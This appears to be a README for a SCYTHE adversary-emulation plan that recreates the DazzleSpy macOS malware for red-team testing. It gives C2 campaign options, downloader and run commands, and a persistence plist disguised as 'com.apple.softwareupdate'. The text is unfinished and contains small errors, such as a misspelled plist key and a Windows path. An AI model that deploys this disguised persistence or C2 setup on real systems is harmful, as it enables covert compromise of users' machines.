##DazzleSpy 

This threat is based on the [WeLiveSecure](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/) threat report released on January 25,2022. 

# Dazzle Spy 
1. Download and import the threats in JSON format to your SCYTHE instace
2. Download the Virtual File System (VFS) files under DazzleSpy/VFS. 
3. Upload the VFS file to your SCYTHE VFS in the following location: VFS:/shared/DazzleSpy
4. Create a new campaign DazzleSpy with HTTPS and the communication option. You can import the `config.json` or manually add 
`--cp yourdomain.com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10` 
5. Import Existing Threat: *DazzleSpy*
6. Start Campaign


## DazzleSpy Stage 1.
```bash
loader --load downloader 
downloader --src VFS:/shared/ --dest C:/Users/
loader --load run
run whoami
run 

```
1. Persistence 
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN"
        "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
        <dict>
            <key>KeepAlive</key>
            <true/>
            <key>Label</key>
            <string>com.apple.softwareupdate</string>
            <key> ProgramArgumnets</key>
            <array>
                <string>/var/root/.local/softwareupdate</string>
                <string>1</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>SuccessfulExit</key>
            <true/>
        </dict>
    </plist>
    ```
2. 